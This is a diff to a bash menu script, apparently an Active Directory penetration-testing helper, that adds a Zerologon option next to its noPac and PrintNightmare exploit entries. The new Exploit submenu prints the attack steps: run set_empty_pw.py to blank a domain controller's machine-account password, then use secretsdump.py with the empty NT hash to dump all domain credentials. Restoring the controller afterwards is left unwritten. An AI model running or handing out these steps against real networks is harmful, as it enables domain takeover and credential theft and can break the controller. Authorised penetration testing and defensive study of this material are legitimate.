@@ -13,7 +13,7 @@ NQUsername="";			#
 Password="''";			#
 Domain="''";			#
 NQDomain="";			#
-IP="''";			#
+IP="'[IP]'";			#
 NQIP="";			#
 LDAP="";			#
 DC="";				#
@@ -28,6 +28,7 @@ MainCheck="1"			#
 "https://github.com/cybersecurityworks553/CVE-2021-1675_PrintNightMare.git"
 "https://github.com/ly4k/Pachine.git"
 "https://github.com/WazeHell/sam-the-admin.git"
+"https://github.com/NickSanzotta/zeroscan.git"
 
 
 
@@ -2738,6 +2739,7 @@ echo -ne " What would you like to do?
 
 	1)  ->  [ NoPac		  ]  ${LYELLOW}WIP${RESTORE}
 	2)  -> 	[ Print Nightmare ]  ${LYELLOW}WIP${RESTORE}
+	3)  ->	[ Zerologon	  ]  ${LYELLOW}WIP${RESTORE}
 	
 	Q)  ->	[Previous Menu	  ]
 
@@ -2746,6 +2748,7 @@ echo -ne " What would you like to do?
         case $a in
                 1) 	External_Menu_CVEs_NoPac ;;
                 2)	External_Menu_CVEs_PrintNightmare ;;
+                3)	External_Menu_CVEs_Zerologon ;;
                 q|Q)	External_Menu_Main ;;
 		0) exit 0 ;;
 		*) echo -e "Wrong option."
@@ -2971,6 +2974,102 @@ echo -ne  "Return to Previous Menu?
 
 }
 
+External_Menu_CVEs_Zerologon(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Zerologon Menu${RESTORE}"
+
+echo -ne " What would you like to do?
+
+
+	1)  ->  [ Check    	]
+	2)  ->	[ Exploit  	]
+	
+	Q)  ->	[Previous Menu	]
+
+"
+        read a
+        case $a in
+                1) 	External_Menu_CVEs_Zerologon_Check ;;
+                2)	External_Menu_CVEs_Zerologon_Exploit ;;
+                q|Q) 	External_Menu_CVEs ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+External_Menu_CVEs_Zerologon_Check(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Zerologon (Check)${RESTORE}"
+echo -e ""
+# Add install to script
+echo -e "${IBLUE}ZeroScan${RESTORE}"
+echo -e "zeroscan.py -t [DC_NETBIOS_NAME] $IP"
+echo -e ""
+echo -e ""
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_CVEs_Zerologon ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+}
+
+
+External_Menu_CVEs_Zerologon_Exploit(){
+
+    clear
+    
+echo -e ""
+echo -e ""
+echo -e ""
+echo -e "${LGREEN}Zerologon (RCE) (Exploit)${RESTORE}"
+echo -e ""
+echo -e "${IBLUE}#1: Exploit the Domain Controller${RESTORE}"
+# Add install to script
+echo -e "python3 set_empty_pw.py [DC_NETBIOS_NAME] $IP"
+echo -e ""
+echo -e "${IBLUE}#2: DC sync with secretsdump.py${RESTORE}"
+echo -e "secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 '$Domain/[DC_NETBIOS_NAME]@$IP'"
+echo -e ""
+echo -e ""
+echo -e "${LYELLOW}Create section for DC restoration${RESTORE}"
+echo -e ""
+
+echo -ne  "Return to Previous Menu?
+
+    
+        Q)  ->	[Previous Menu		    ]
+"
+
+        read a
+        case $a in
+        	q|Q) 	External_Menu_CVEs_Zerologon ;;
+		0) exit 0 ;;
+		*) echo -e "Wrong option."
+        esac
+
+
+}
 External_Variables_Required(){
 
 	clear
